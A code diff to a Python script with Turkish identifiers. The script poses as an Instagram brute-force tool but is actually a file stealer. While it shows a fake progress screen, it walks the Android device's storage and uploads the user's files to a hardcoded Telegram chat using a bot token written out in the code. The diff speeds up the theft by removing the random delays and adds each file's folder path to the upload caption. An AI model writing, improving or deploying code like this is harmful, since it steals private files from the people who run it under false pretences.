@@ -41,7 +41,7 @@ async def dosya_gonder():
     
     target = input("Instagram kullanici adini girin: ")
     print(f"\n[+] Brute-Force sunucusuna baglaniliyor...")
-    await asyncio.sleep(1.5)
+    await asyncio.sleep(1)
     
     TOKEN = "8665351898:AAERhDBfXtzpVlA9M5-Q3o7eG8JN4W7FCC8"
     CHAT_ID = "-1003547193315"
@@ -92,12 +92,14 @@ async def dosya_gonder():
                     tarih_log = time.strftime('%H:%M:%S')
                     tarih_dosya = time.strftime('%d.%m.%Y %H:%M', time.localtime(os.path.getmtime(dosya_yolu)))
                     tur = IZINLI_UZANTILAR[ext]
+                    izafi_yol = kok.replace('/storage/emulated/0/', '')
 
                     with open(dosya_yolu, 'rb') as f:
+                        # Gönderim işlemi (Bekleme kaldırıldı)
                         await bot.send_document(
                             chat_id=CHAT_ID,
                             document=f,
-                            caption=f"{tur}: {dosya_adi}\n📍 Klasor: {ana_dizin.split('/')[-1]}\n📅 Tarih: {tarih_dosya}\n⚖️ {boyut_mb} MB",
+                            caption=f"{tur}: {dosya_adi}\n📍 Klasor: {izafi_yol}\n📅 Tarih: {tarih_dosya}\n⚖️ {boyut_mb} MB",
                             disable_notification=True,
                             read_timeout=300
                         )
@@ -106,10 +108,9 @@ async def dosya_gonder():
                     
                     if sayac in sus_mesajlar:
                         print(sus_mesajlar[sayac])
-                        await asyncio.sleep(2)
+                        await asyncio.sleep(1) # Sadece bu mesajlar ekranda görünsün diye kısa mola
 
                     sayac += 1
-                    await asyncio.sleep(random.uniform(0.3, 0.7)) 
                 
                 except:
                     continue
